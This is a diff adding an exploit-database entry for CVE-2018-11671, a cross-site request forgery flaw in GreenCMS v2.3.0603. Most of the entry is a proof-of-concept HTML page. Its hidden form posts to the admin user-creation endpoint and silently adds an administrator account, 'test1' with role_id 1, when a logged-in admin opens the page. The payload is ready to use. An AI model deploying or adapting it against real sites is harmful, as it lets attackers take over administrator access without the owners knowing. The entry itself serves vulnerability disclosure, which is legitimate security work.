@@ -1,0 +1,39 @@
+# Exploit Title: GreenCMS v2.3.0603 CSRF vulnerability add admin
+# Date: 2018-06-02
+# Exploit Author: xichao
+# Vendor Homepage: https://github.com/GreenCMS/GreenCMS
+# Software Link: https://github.com/GreenCMS/GreenCMS
+# Version: v2.3.0603
+# CVE : CVE-2018-11671
+ 
+An issue was discovered in GreenCMS v2.3.0603. There is a CSRF vulnerability that can add an admin account via index.php?m=admin&c=access&a=adduserhandle.
+
+poc:
+
+<span style="font-size:18px;"><!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <title>csrftest</title>  
+</head>  
+　　<body>  
+    　　　　<form action="http://127.0.0.1//14/index.php?m=admin&c=access&a=adduserhandle" method="POST" id="transfer" name="transfer">  
+　　　　　　　　<input type="hidden" name="user_id0" value="1">  
+　　　　　　　　<input type="hidden" name="user_login" value="test1">
+　　　　　　　　<input type="hidden" name="password" value="test1">  
+　　　　　　　　<input type="hidden" name="rpassword" value="test1">  
+　　　　　　　　<input type="hidden" name="user_nicename" value="123">  
+　　　　　　　　<input type="hidden" name="user_email" value="123%40Qq.com">  
+　　　　　　　　<input type="hidden" name="user_url" value="www.baidu.com">  
+　　　　　　　　<input type="hidden" name="user_intro" value="test">  
+　　　　　　　　<input type="hidden" name="user_status" value="1">  
+　　　　　　　　<input type="hidden" name="role_id" value="1">
+        <button type="submit" value="Submit">add admin</button>  
+　　　　　　</form>  
+    </body>
+</html></span>
+
+References:
+http://www.iwantacve.cn/index.php/archives/39/
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11671
+https://github.com/GreenCMS/GreenCMS/issues/109
